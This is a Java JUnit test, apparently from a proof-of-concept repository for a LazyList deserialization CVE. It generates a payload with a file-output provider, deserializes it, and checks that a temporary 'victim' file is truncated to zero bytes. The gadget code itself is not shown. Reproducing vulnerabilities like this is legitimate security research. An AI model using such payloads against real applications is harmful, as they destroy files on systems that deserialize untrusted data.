package poc.cve.lazylist.payload;

import org.junit.Before;
import org.junit.Test;
import poc.cve.lazylist.function0.DefaultProviders;
import static poc.cve.lazylist.util.SerdeUtil.*;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

import static org.junit.Assert.*;

public class LazyListTest {

    private final byte[] initialFileData = "Some text data.".getBytes(StandardCharsets.UTF_8);
    private File victimFile;
    @Before
    public void setUp() throws IOException {
        // Given: victim file with some initial data inside
        victimFile = File.createTempFile("victim-file-", "-tmp");
        victimFile.deleteOnExit();
        try (FileOutputStream fos = new FileOutputStream(victimFile)) {
            fos.write(initialFileData);
            fos.flush();
        }
        assertEquals(initialFileData.length, victimFile.length());
    }
    @Test
    public void generatePayload() {
        // When: LazyList's with FILE_OUT provider payload is being deserialized
        PayloadGenerator payloadGenerator = new LazyList(DefaultProviders.FILE_OUTPUT);
        byte[] payload = payloadGenerator.generatePayload(victimFile.getAbsolutePath(), false);
        try {
            deserialize(payload);
        }
        catch (RuntimeException e) {
            // ClassCastException is expected
            if (!(e.getCause() instanceof ClassCastException)) {
                throw e;
            }
        }

        // Then: victim file is truncated
        assertEquals(0, victimFile.length());
    }
}